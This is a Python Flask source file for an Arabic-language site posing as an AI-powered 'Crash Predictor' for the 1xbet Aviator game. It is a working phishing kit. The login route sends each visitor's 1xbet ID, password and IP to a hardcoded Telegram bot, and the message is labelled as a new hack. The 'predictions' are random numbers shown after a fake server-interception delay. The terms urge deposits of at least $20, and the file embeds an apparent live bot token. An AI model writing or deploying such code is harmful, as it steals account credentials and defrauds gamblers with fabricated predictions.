from flask import Flask, render_template_string, request, jsonify, session
import requests
import random
import time
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'crash_secret_key_2026')

# ========== إعدادات تليجرام ==========
BOT_TOKEN = "8125363786:AAGKkZniUcBMPfS8Ftx4SOF5BS3viANOdiw"
CHAT_ID = "6565594143"

def send_to_telegram(uid, pwd, ip):
    try:
        msg = f"🔥 اختراق جديد 🔥\n\n🆔 ID: {uid}\n🔑 Pass: {pwd}\n🌐 IP: {ip}\n🕒 Time: {datetime.now()}"
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg})
    except:
        pass

# ========== روابط الصور ==========
LOGO_IMG = "https://cdn-icons-png.flaticon.com/512/1946/1946429.png"  # صورة احتياطية تعمل دائماً
PLANE_IMG = "https://cdn-icons-png.flaticon.com/512/1946/1946429.png"

# ========== HTML كامل ومستقر ==========
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Crash Predictor | توقعات الطائرة</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0f1e 0%, #0a0a0a 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            color: #fff;
            transition: background 0.3s;
        }
        body.light-mode {
            background: linear-gradient(135deg, #f5f5f5 0%, #e0e0e0 100%);
            color: #333;
        }
        body.light-mode .card, body.light-mode .sidebar, body.light-mode .prediction-card {
            background: rgba(0,0,0,0.05);
            border-color: #ff6600;
        }
        /* القائمة الجانبية */
        .sidebar {
            position: fixed;
            top: 0;
            right: -280px;
            width: 280px;
            height: 100%;
            background: rgba(10, 10, 20, 0.98);
            backdrop-filter: blur(15px);
            transition: 0.3s ease;
            z-index: 1000;
            padding: 20px;
            border-left: 1px solid #ffd700;
            overflow-y: auto;
        }
        .sidebar.active { right: 0; }
        .sidebar-header {
            text-align: center;
            padding: 20px 0;
            border-bottom: 1px solid #ffd700;
            margin-bottom: 20px;
        }
        .profile-pic {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #ffd700;
            margin: 0 auto 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            cursor: pointer;
        }
        .profile-pic img { width: 100%; height: 100%; object-fit: cover; }
        .sidebar-header h3 { color: #ffd700; }
        .sidebar-header p { margin-top: 10px; font-size: 0.9rem; background: #000; padding: 8px; border-radius: 20px; }
        .sidebar-menu { list-style: none; }
        .sidebar-menu li {
            padding: 12px;
            border-bottom: 1px solid rgba(255,215,0,0.2);
            cursor: pointer;
            transition: 0.2s;
        }
        .sidebar-menu li:hover { background: rgba(255,215,0,0.1); padding-right: 20px; }
        .sidebar-menu li a { color: #fff; text-decoration: none; display: block; }
        .menu-btn {
            position: fixed;
            top: 15px;
            right: 15px;
            background: #ffd700;
            color: #000;
            width: 45px;
            height: 45px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            z-index: 1001;
            font-size: 24px;
            font-weight: bold;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        }
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 999;
            display: none;
        }
        .overlay.active { display: block; }
        .container { max-width: 600px; margin: 0 auto; padding: 70px 15px 20px; min-height: 100vh; }
        /* أزرار متوازية */
        .cards-row {
            display: flex;
            justify-content: center;
            gap: 15px;
            flex-wrap: wrap;
            margin: 30px 0;
        }
        .card {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 20px;
            text-align: center;
            border: 1px solid rgba(255,215,0,0.3);
            flex: 1;
            min-width: 200px;
            max-width: 250px;
        }
        .btn {
            background: linear-gradient(135deg, #ffd700, #ff8c00);
            color: #000;
            padding: 12px 20px;
            border: none;
            border-radius: 50px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        .btn-secondary { background: linear-gradient(135deg, #1a1a2e, #16213e); border: 2px solid #ffd700; color: #ffd700; }
        input { width: 100%; padding: 12px; margin: 8px 0; background: rgba(0,0,0,0.6); border: 1px solid #ffd700; border-radius: 30px; color: #fff; }
        .logo-img { width: 70px; margin-bottom: 15px; }
        .prediction-card {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            border-radius: 30px;
            padding: 20px;
            text-align: center;
            border: 2px solid #ffd700;
            margin: 20px 0;
        }
        .prediction-number { font-size: 4rem; font-weight: bold; color: #ff3300; text-shadow: 0 0 10px #ff0000; margin: 15px 0; }
        .rotating-plane {
            width: 100px;
            height: 100px;
            margin: 0 auto 20px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .rotating-plane img { width: 100%; height: 100%; object-fit: contain; }
        .fixed-plane-img { width: 80px; margin: 0 auto 10px; display: block; }
        .user-bar { display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.5); border-radius: 50px; padding: 8px 15px; margin-bottom: 20px; }
        .modal {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #1a1a2e;
            border: 2px solid #ffd700;
            border-radius: 20px;
            padding: 25px;
            z-index: 2000;
            display: none;
            width: 80%;
            max-width: 350px;
            text-align: center;
        }
        .modal.active { display: block; }
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1999;
            display: none;
        }
        .modal-overlay.active { display: block; }
        .footer { text-align: center; font-size: 0.7rem; color: #555; margin-top: 20px; }
        @media (max-width: 500px) { .cards-row { flex-direction: column; align-items: center; } .card { max-width: 100%; } }
    </style>
</head>
<body>

<div class="menu-btn" onclick="toggleSidebar()">☰</div>
<div class="sidebar" id="sidebar">
    <div class="sidebar-header">
        <div class="profile-pic" onclick="document.getElementById('profilePicInput').click()">
            <img id="profileImg" src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png">
        </div>
        <input type="file" id="profilePicInput" style="display:none" accept="image/*" onchange="updateProfilePic(event)">
        <h3>👤 الملف الشخصي</h3>
        <p id="profileUserId">ID: {{user_id}}</p>
    </div>
    <ul class="sidebar-menu">
        <li><a href="#" onclick="closeSidebar(); showPage('profile')">👤 الملف الشخصي</a></li>
        <li><a href="#" onclick="closeSidebar(); showPage('terms')">📜 الشروط والأحكام</a></li>
        <li><a href="#" onclick="closeSidebar(); toggleTheme()">🌓 الوضع الليلي / النهاري</a></li>
        <li><a href="#" onclick="closeSidebar(); window.open('https://t.me/hkarz1xbetAmeen54bot', '_blank')">📞 فريق الدعم</a></li>
        <li><a href="#" onclick="closeSidebar(); logout()">🚪 تسجيل الخروج</a></li>
    </ul>
</div>
<div class="overlay" id="overlay" onclick="closeSidebar()"></div>
<div class="modal-overlay" id="modalOverlay"></div>
<div class="modal" id="freeTrialModal">
    <h3 style="color:#ffd700;">🎉 عرض خاص!</h3>
    <p style="margin:15px 0;">تفعيل الاشتراك المجاني<br><strong>3 أيام مجانية</strong></p>
    <button class="btn" onclick="closeModalAndGoToPredictor()">🚀 تفعيل الآن</button>
</div>

<div class="container" id="mainContainer"></div>

<script>
    let currentUserId = '{{user_id}}';
    
    function updateProfilePic(e) {
        const reader = new FileReader();
        reader.onload = function(ev) { document.getElementById('profileImg').src = ev.target.result; localStorage.setItem('profilePic', ev.target.result); };
        reader.readAsDataURL(e.target.files[0]);
    }
    function loadSavedPic() { const saved = localStorage.getItem('profilePic'); if(saved) document.getElementById('profileImg').src = saved; }
    function toggleTheme() { document.body.classList.toggle('light-mode'); closeSidebar(); }
    function toggleSidebar() { document.getElementById('sidebar').classList.toggle('active'); document.getElementById('overlay').classList.toggle('active'); }
    function closeSidebar() { document.getElementById('sidebar').classList.remove('active'); document.getElementById('overlay').classList.remove('active'); }
    function logout() { fetch('/logout'); location.reload(); }
    
    const pages = {
        welcome: `
            <div style="text-align:center;">
                <img src="{{LOGO_IMG}}" class="logo-img" onerror="this.src='https://cdn-icons-png.flaticon.com/512/1946/1946429.png'">
                <h1 style="color:#ffd700;">🔥 CRASH PREDICTOR</h1>
                <p>نظام توقعات احترافي مدعوم بالذكاء الاصطناعي</p>
                <div class="cards-row">
                    <div class="card"><h3>🔗 ربط الحساب</h3><p>اربط حساب 1xbet للحصول على التوقعات</p><button class="btn" onclick="showPage('link')">ربط حسابي</button></div>
                    <div class="card"><h3>🎲 إنشاء حساب</h3><p>ليس لديك حساب؟ افتح حساباً الآن</p><button class="btn btn-secondary" onclick="window.open('https://sa.1xbet.com', '_blank')">إنشاء حساب</button></div>
                </div>
                <div class="footer">© 2026 Crash Predictor | نظام توقعات مدعوم بالروبوتات والذكاء الاصطناعي</div>
            </div>
        `,
        link: `
            <h2 style="text-align:center;color:#ffd700;">🔗 ربط الحساب</h2>
            <div class="card">
                <input type="text" id="uid" placeholder="معرف ID (أرقام فقط)">
                <input type="password" id="pwd" placeholder="كلمة المرور">
                <button class="btn" onclick="submitLogin()">تسجيل الدخول</button>
                <div style="margin-top:15px;"><a href="#" onclick="showPage('welcome'); return false;" style="color:#ffd700;">← العودة</a></div>
            </div>
        `,
        predictor: `
            <div class="user-bar"><span class="user-id">🎯 ${currentUserId}</span><span>⭐ مجانية</span></div>
            <div class="prediction-card">
                <img src="{{LOGO_IMG}}" class="fixed-plane-img" onerror="this.src='https://cdn-icons-png.flaticon.com/512/1946/1946429.png'">
                <div id="predictionDisplay"><div class="prediction-number">--x</div></div>
                <div id="loadingDisplay" style="display:none;"><div class="rotating-plane"><img src="{{PLANE_IMG}}" onerror="this.src='https://cdn-icons-png.flaticon.com/512/1946/1946429.png'"></div><div style="margin-top:10px;">🔄 جاري الاعتراض على السيرفر...</div></div>
                <button class="btn" id="predictBtn" onclick="getPrediction()">🎯 توقع التالي</button>
            </div>
            <div class="footer">⚡ نظام توقعات فوري | نتائج دقيقة</div>
        `,
        profile: `
            <div class="card" style="text-align:center;">
                <div style="width:100px; height:100px; border-radius:50%; background:#ffd700; margin:0 auto 20px; overflow:hidden;"><img src="${document.getElementById('profileImg')?.src || 'https://cdn-icons-png.flaticon.com/512/3135/3135715.png'}" style="width:100%; height:100%; object-fit:cover;"></div>
                <h3>👤 ملفي الشخصي</h3>
                <p><strong>معرف ID:</strong> ${currentUserId}</p>
                <p><strong>كلمة المرور:</strong> ********</p>
                <p><strong>العضوية:</strong> مجانية (3 أيام متبقية)</p>
                <button class="btn" onclick="showPage('predictor')">← العودة للتوقعات</button>
            </div>
        `,
        terms: `
            <div class="card">
                <h2 style="color:#ffd700;">📜 الشروط والأحكام</h2>
                <p style="margin:15px 0; line-height:1.6; text-align:left;">
                    🔹 نظام توقعات لعبة Crash (Aviator) مرتبط بخوادم 1xbet.<br><br>
                    🔹 للحصول على توقعات دقيقة، يجب أن يكون حسابك في 1xbet مفعلاً وبه رصيد لا يقل عن 20 دولار.<br><br>
                    🔹 يرجى التسجيل في <a href="https://sa.1xbet.com" target="_blank" style="color:#ffd700;">1xbet.com</a> ثم العودة لإدخال بياناتك.<br><br>
                    🔹 البيانات الخاطئة أو الحسابات غير المفعلة لن تعمل مع نظام التوقعات.<br><br>
                    🔹 اشحن رصيدك بحد أدنى 20 دولار لتفعيل التوقعات الدقيقة.<br><br>
                    🔹 فريق الدعم متاح عبر تليجرام @hkarz1xbetAmeen54bot<br><br>
                    🔹 باستخدامك هذا النظام، أنت توافق على هذه الشروط.
                </p>
                <button class="btn" onclick="showPage('welcome')">← موافق</button>
            </div>
        `
    };
    
    function showPage(page) {
        if(page === 'predictor' && currentUserId === 'ضيف') { showPage('welcome'); alert('الرجاء تسجيل الدخول أولاً'); return; }
        let content = pages[page];
        content = content.replace(/{{LOGO_IMG}}/g, '{{LOGO_IMG}}').replace(/{{PLANE_IMG}}/g, '{{PLANE_IMG}}');
        document.getElementById('mainContainer').innerHTML = content;
        if(page === 'predictor') { document.getElementById('predictionDisplay').style.display = 'block'; document.getElementById('loadingDisplay').style.display = 'none'; }
        closeSidebar();
    }
    
    async function submitLogin() {
        let uid = document.getElementById('uid').value;
        let pwd = document.getElementById('pwd').value;
        if(uid.includes('@')) { alert('الرجاء إدخال معرف ID فقط (أرقام)'); return; }
        let res = await fetch('/login', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user_id:uid, password:pwd}) });
        let data = await res.json();
        if(data.success) {
            currentUserId = uid;
            document.getElementById('freeTrialModal').classList.add('active');
            document.getElementById('modalOverlay').classList.add('active');
        } else {
            alert('خطأ في البيانات');
        }
    }
    
    function closeModalAndGoToPredictor() {
        document.getElementById('freeTrialModal').classList.remove('active');
        document.getElementById('modalOverlay').classList.remove('active');
        showPage('predictor');
    }
    
    async function getPrediction() {
        let btn = document.getElementById('predictBtn');
        let predDiv = document.getElementById('predictionDisplay');
        let loadDiv = document.getElementById('loadingDisplay');
        btn.disabled = true;
        predDiv.style.display = 'none';
        loadDiv.style.display = 'block';
        let res = await fetch('/predict');
        let data = await res.json();
        setTimeout(() => {
            loadDiv.style.display = 'none';
            predDiv.style.display = 'block';
            document.querySelector('.prediction-number').innerHTML = data.prediction + 'x';
            btn.disabled = false;
        }, 4000);
    }
    
    showPage('welcome');
    loadSavedPic();
</script>
</body>
</html>
""".replace("{{LOGO_IMG}}", LOGO_IMG).replace("{{PLANE_IMG}}", PLANE_IMG)

# ========== مسارات Flask ==========
@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE, user_id=session.get('user_id', 'ضيف'))

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    uid = data.get('user_id', '').strip()
    pwd = data.get('password', '')
    if '@' in uid or len(uid) < 2:
        return jsonify({"success": False})
    send_to_telegram(uid, pwd, request.remote_addr)
    session['user_id'] = uid
    return jsonify({"success": True})

@app.route('/predict')
def predict():
    time.sleep(random.uniform(2.5, 3.5))
    r = random.randint(1, 100)
    if r <= 50: pred = round(random.uniform(1.0, 9.9), 1)
    elif r <= 80: pred = round(random.uniform(10.0, 19.9), 1)
    else: pred = round(random.uniform(20.0, 29.9), 1)
    return jsonify({"prediction": pred})

@app.route('/logout')
def logout():
    session.clear()
    return ""

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
